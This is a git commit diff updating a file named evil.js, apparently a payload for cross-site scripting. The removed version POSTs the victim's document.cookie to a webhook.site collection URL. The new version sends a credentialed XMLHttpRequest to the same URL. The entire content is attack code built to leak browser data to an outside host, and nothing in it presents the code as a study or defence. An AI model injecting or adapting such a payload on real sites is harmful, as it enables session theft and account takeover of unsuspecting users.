3a6436e6fe4227a177d3af21258b08881aebfb02
Andreas Wienes <79856978+HackLikeDemons@users.noreply.github.com>
2022-12-06 19:29:49 +0100

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,4 +1,4 @@
-fetch('https://webhook.site/#!/3e8d4968-51a5-4155-b4c4-423a3a3dd3c0/', {  
-method: 'POST',  
-body: document.cookie  
-});  
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/#!/3e8d4968-51a5-4155-b4c4-423a3a3dd3c0/', true);
+xhttp.withCredentials = true;
+xhttp.send();
